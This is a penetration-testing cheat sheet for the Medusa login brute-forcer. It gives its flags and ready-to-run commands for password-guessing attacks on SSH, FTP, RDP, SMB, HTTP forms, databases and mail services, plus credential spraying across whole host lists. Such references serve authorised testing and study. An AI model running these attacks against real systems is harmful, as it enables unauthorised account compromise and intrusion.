# Medusa

**Tags:** `#medusa` `#bruteforce` `#passwordattack` `#auth` `#spray` `#parallelbrute`

Speedy, parallel, modular login brute-forcer. Similar to Hydra but stands out for multi-host targeting — feed it a host file and it attacks all targets simultaneously. Good for sweeping an entire subnet for a single credential set. Supports 20+ modules covering common services.

**Source:** https://github.com/jmk-foofus/medusa
**Install:** `sudo apt install medusa` — pre-installed on Kali

```bash
# Basic syntax
medusa -h <host> -u <user> -P <passlist> -M <module>

# List available modules
medusa -d

# Check module options
medusa -M ssh -q
```

> [!note] **Medusa vs Hydra** — Both are solid brute-forcers. Medusa's key advantage is multi-host targeting (`-H hosts.txt`) — it can sweep an entire subnet in one run. Hydra has broader protocol support and better HTTP form handling. Use Medusa when you need to spray credentials across many hosts at once.

---

## Parameters

| Flag | Description |
|---|---|
| `-h HOST` / `-H FILE` | Single host or file of hosts |
| `-u USER` / `-U FILE` | Single username or username list |
| `-p PASS` / `-P FILE` | Single password or password list |
| `-M MODULE` | Protocol module to use |
| `-m "OPTIONS"` | Module-specific options |
| `-t TASKS` | Parallel tasks per host (default: 4) |
| `-T HOSTS` | Total number of hosts to test simultaneously |
| `-f` | Stop after first valid login on current host |
| `-F` | Stop after first valid login on any host |
| `-n PORT` | Non-default port |
| `-e ns` | Try null password and username-as-password |
| `-v LEVEL` | Verbosity (0–6, default 5) |
| `-O FILE` | Log output to file |

---

## Common Protocols

### SSH

```bash
medusa -h 10.10.10.10 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ssh -t 4
medusa -h 10.10.10.10 -u admin -P passwords.txt -M ssh -n 2222    # non-standard port
```

### FTP

```bash
medusa -h 10.10.10.10 -u fiona -P /usr/share/wordlists/rockyou.txt -M ftp
medusa -h 10.10.10.10 -u ftpuser -P passwords.txt -M ftp -n 2121 -t 5
```

### RDP

```bash
medusa -h 10.10.10.10 -U users.txt -p 'Password123' -M rdp
```

### SMB

```bash
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M smbnt
```

### HTTP Basic Auth

```bash
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M http -m DIR:/admin
```

### HTTP Form (POST)

```bash
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M web-form \
  -m "FORM:username=^USER^&password=^PASS^" \
  -m "DENY:Invalid credentials"
```

### MySQL / MSSQL

```bash
medusa -h 10.10.10.10 -u root -P passwords.txt -M mysql
medusa -h 10.10.10.10 -u sa -P passwords.txt -M mssql
```

### IMAP / POP3 / SMTP

```bash
medusa -h mail.target.com -U users.txt -P passwords.txt -M imap
medusa -h mail.target.com -U users.txt -P passwords.txt -M pop3
medusa -h mail.target.com -U users.txt -P passwords.txt -M smtp
```

---

## Multi-Host Targeting

The main differentiator from Hydra — sweep an entire subnet or host list simultaneously.

```bash
# Spray one credential across all hosts in a file
medusa -H hosts.txt -u administrator -p 'Welcome1' -M smbnt -F

# Spray a credential list across all hosts — stop on first hit per host
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -f -t 4

# Control total parallel hosts (-T) and tasks per host (-t)
medusa -H hosts.txt -u admin -P passwords.txt -M ssh -T 10 -t 2
```

---

## Supported Modules

| Module | Protocol |
|---|---|
| `ssh` | SSH v2 |
| `ftp` | FTP |
| `rdp` | Remote Desktop Protocol |
| `smbnt` | SMB / Windows auth |
| `http` | HTTP Basic Auth |
| `web-form` | HTTP form (GET/POST) |
| `imap` | IMAP |
| `pop3` | POP3 |
| `smtp` | SMTP |
| `mysql` | MySQL |
| `mssql` | Microsoft SQL Server |
| `postgres` | PostgreSQL |
| `vnc` | VNC |
| `telnet` | Telnet |
| `svn` | Subversion |
| `snmp` | SNMP community strings |

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
